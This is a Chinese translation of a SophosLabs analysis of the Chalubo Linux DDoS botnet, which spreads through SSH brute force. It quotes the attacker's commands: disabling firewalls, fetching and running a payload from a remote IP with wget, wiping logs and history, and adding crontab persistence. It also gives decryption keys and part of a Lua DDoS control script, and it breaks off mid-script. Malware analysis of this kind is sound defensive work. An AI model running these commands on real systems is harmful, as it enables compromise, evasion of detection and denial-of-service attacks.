本文为翻译稿件，原文为：https://news.sophos.com/en-us/2018/10/22/chalubo-botnet-wants-to-ddos-from-your-server-or-iot-device/
    暴力使用SSH攻击的攻击者已经开始部署新一轮的协同式DDos攻击。
自9月初以来，将目标瞄准SSH服务器的Linux系统上的攻击被SophosLabs持续的进行关注。根据其发现，这些攻击已经放弃了我们称之为Chalubo的最新拒绝服务自动化攻击系列工具。
攻击者使用ChaCha流密码加密主应用组件及其相应的Lua脚本。
这种逆向技术的采用帮助我们分析出来了Linux恶意软件的发展历程，然而作者已经采用了更常见的Windows恶意软件原理以阻止检测的实施。
与其前身一样，Chalubo整合了Xor.DDoS和Mirai恶意软件系列的代码。
Chalubo下载器于8月下旬开始在网络中流传。黑客在受害者的设备上发出命令以检索其软件，该恶意软件实际上由三部分组成：下载器;、主bot程序（仅在具有x86处理器架构的系统上运行）和Lua命令脚本。
截至10月中旬，攻击者持续的发出检索Elknot dropper（检测为Linux / DDoS-AZ）的命令，后者又提供Chalubo（ChaCha-Lua-bot）软件包的其余部分代码。
此外，我们现在可以看到在不同处理器架构上运行的各种bot版本程序，包括32位和64位的ARM，x86，x86_64，MIPS，MIPSEL和PowerPC。  
这些现象表明测试期结束，之后我们可能会看到有关攻击活动数量会持续增加。
### 具体攻击
SophosLabs发现Chalubo系列是一种攻击蜜罐，我们用它来收集有关恶意活动的数据。
我们在2018年9月6日记录了相关攻击，机器人尝试对SSH服务器强制登录凭据;
我们的蜜罐为攻击者提供了一个真正的shell外观，此shell可以保存各种攻击步骤。 攻击者使用root：admin的组合获得一个shell
......至少来说，这是他们的一些想法。
一旦攻击者“访问”蜜罐服务器，他们就会发出以下命令。
    /etc/init.d/iptables stop
    service iptables stop
    SuSEfirewall2 stop
    reSuSEfirewall2 stop
    chattr -i /usr/bin/wget
    chmod 755 /usr/bin/wget
    yum install -y wget
    wget -c hxxp://117.21.191.108:8694/libsdes -P /usr/bin/
    chmod 777 /usr/bin/libsdes
    nohup /usr/bin/libsdes > /dev/null 2>&1 &
    export HISTFILE=/dev/null
    rm -f /var/log/wtmp
    history -c
这些蜜罐里所呈现的简单攻击都十分常见，但是这里突出的是libsdes相关样本。与我们常见的标准Linux的bots攻击相比，这个应用更具有复杂性。攻击者不仅使用了分层方法来删除恶意组件，而且使用的加密不是我们Linux里常见的加密类型。
另外，在9月底，同一攻击者集群再次袭击了我们的蜜罐系统。我们在蜜罐中找到了一些呦Elknot开发的BillGates恶意软件系列[Linux / DDoS-BD]。 恶意样本来自地址hxxp://117.21.191.108:8269 / start。
### 下载器
首次执行时，libsdes示例为了防止恶意软件的多次出现，会创建一个空文件/tmp/tmp.l。 然后应用尝试将自身复制到/ usr / bin
/目录下，并产生一个随机的字母数字字符串作为文件名。 有趣的是，它似乎从Mirai僵尸网络中复制了rand_alphastr函数。
此时，代码将会分叉。 父进程会设置多个持久性攻击点，以便恶意软件能够定期执行代码并可以在重新启动后继续存在。 它通过向/etc/init.d/
添加一个传统的init.d脚本来实现这一点，该脚本符号链接到`/ etc / rc [1..5] .d / S90
`或`/etc/rc.d/ RC[1..5].D/S90`。
非常有趣的是，它还删除了一个带可识别路径的脚本文件`（/etc/cron.hourly/gcc4.sh）`，该路径被添加到`/ etc /
crontab`并通过命令每3分钟运行一次：
    sed -i '/\/etc\/cron.hourly\/gcc4.sh/d' /etc/crontab && echo '*/3 * * * * root /etc/cron.hourly/gcc4.sh' >> /etc/crontab
这些脚本如下所示：
    #!/bin/sh
    PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
    cp /lib/libudev4.so /lib/libudev4.so.6
    /lib/libudev4.so.6
这些脚本设计的非常巧妙，因为它引用了曾经Xor.DDoS恶意软件的文件脚本（Sophos检测为Linux / DDoS-BH）。此脚本删除的方式与Xor.DDoS系列完全匹配。事实上，如果仔细查看负责持久攻击部分的代码的话，Chalubo已经从Xor.DDoS系列中复制了DelService和AddService函数。
除了这些功能之外，代码结束的地方还有一些小的相似之处。 很显然，Chalubo的作者访问Xor.DDoS的源代码，但它们绝不属于同一个类型。
子进程的第一个操作是将其进程名称修改为`crond`或`[kworker / 1：1]`，然后下载、解密、解压缩并运行下一个ELF二进制的payload。
之后检查修改过的HTTP响应头以确定是否应下载此payload，我们记录的攻击显示样本自2018年8月27日星期一09:57:30
GMT后便已经存在，并且是从`hxxp:// q111333下`载的。 顶部：`8852 / pc / i486它`被送入ChaCha解密程序。
在解密之后，使用LZMA对有效载荷进行解压缩，然后由execve执行，并使用修改的进程名称作为参数。
### 加密部分
Chalubo使用流密码ChaCha进行加密，并设置轮书为20轮。 在原始算法中，我们希望ChaCha使用16或32字节的密钥和8字节nonce。
这些数用于设置加密初始化以及一个初始化的16字节常量。是否扩展16字节k或扩展32字节k，具体取决于密钥大小以及一个8字节计数器。如果密钥是16字节，则第二次需要使用它来填充初始密钥状态空间的32个字节。
但是，鉴于对等原则。有一个修改过的版本使用了带有4字节计数器的12字节随机数，而不是带有8字节计数器与原始8字节随机数。这也被称为`chacha-ietf`。
Chalubo中的ChaCha-IETF在实现功能时将4字节计数器做单独的参数。
Chalubo实现初始化计数器是从一而不是零开始。
上面提到的具有对等原则的RFC实际上表明：“对于第一个随机数nonce，计数器部分应该等于零。对于生成的每个连续的nonce，我们需要增加1。
但是为了方便，我们可以跳过任何特定的计数器值，并将其排除在所使用的值序列之外。”因此，尽管这个算法比较独特，但它可以被视为标准来实现。
通过各种实现方式，似乎每个人都有自己对counter和nonce字段的看法。 大多数都认为不应该设置计数器，因此硬编码应该从零开始。
其他一些例子，如Linux内核中的加密API将计数器和随机数的最后16个字节视为单个输入参数，但是Libsodium库是使用ChaCha-IETF实现，并且其中用计数器作为单独的参数。即便如此， 参数的顺序与我们在Chalubo中看到的并不完全一致。
例如，下面是Libsodium函数：
    int crypto_stream_chacha20_ietf_xor_ic(unsigned char *c, const unsigned char *m,
                                           unsigned long long mlen,
                                           const unsigned char *n, uint32_t ic,
                                           const unsigned char *k);
这与Chalubo中的功能相同（如果我们重命名一些变量以用于匹配上述例子中的变量）：
    int crypto_stream_chacha20_ietf_xor_ic(const unsigned char *k, uint32_t ic,
                                           const unsigned char *n,
                                           const unsigned char *m, unsigned char *c,
                                           unsigned long long mlen);
所以我们可以说Chalubo ChaCha函数使用了一个独特的实现方法，其算法与peer / IETF相匹配。
下面是下载器中的ChaCha秘钥：
    fa 40 88 55 30 4c a1 99 f6 80 b4 94 b6 9e f4 73 dd 9c 5a 5e 0e 78 ba a4 44 04 8b 82 a8 bd 97 a9
这是下载器和应用中使用的ChaCha随机数：
    00 00 00 00 00 00 00 4a 00 00 00 01
### 应用详情
很明显，一旦我们查看应用的详情，我们会发现Chalubo已经从Mirai复制了一些代码片段，例如一些随机函数和util_local_addr函数的扩展代码。
这个应用中的大部分功能代码都是全新的并且专注于他们自己的Lua处理。而他们的攻击手段主要是用DNS，UDP和SYN风格执行DoS攻击。
内置于应用中的Lua脚本是一个基本控制脚本。它用于调用C2服务器的主页以通知C2有关受感染机器的详细信息。
与下载程序阶段类似，它将检查最后修改的HTTP响应标头，并以从`hxxp://q111333.top:8852 / test /
res.dat`中检索另一个Lua脚本形式的下载任务列表。 此C2命令脚本也使用ChaCha-IETF算法加密，因此Lua脚本会调用函数task_decrypt。 它使用与下载程序相同的随机数nonce，但命令脚本的key值是不同的。
它还通过执行ddos_attack功能“分离”出某些IP地址，这也帮助它进一步了解C2的基础结构。
    tcp = require "tcp".create()
    local_ip = tcp:get_local_ip()
    strip = inet_ntoa(local_ip)
    function ddos_attack(ip,port,isemuip,appendstr)
        [[
        tcp = require "tcp".create()
            local_ip = tcp:get_local_ip()
            local_ip_h24 = htonl(local_ip) & 0xffffff00
        ]]
        if isemuip == false then
            script = script.. [[
            tcp:set_ip_src(local_ip)
            ]]
        end
        script = script .. [[
    if VERSION > 19 then
            if local_ip_h24 == 0x17f70200 then
                tcp:add_src_ip_range("183.131.206.0","183.131.206.255")
            end
    end
        ]]
        appendlen = tonumber(appendstr)
        if appendlen ~= nil and appendlen ~= 0 then
            script = script.. [[
                data = random(appendlen)
                tcp:set_append_data(data)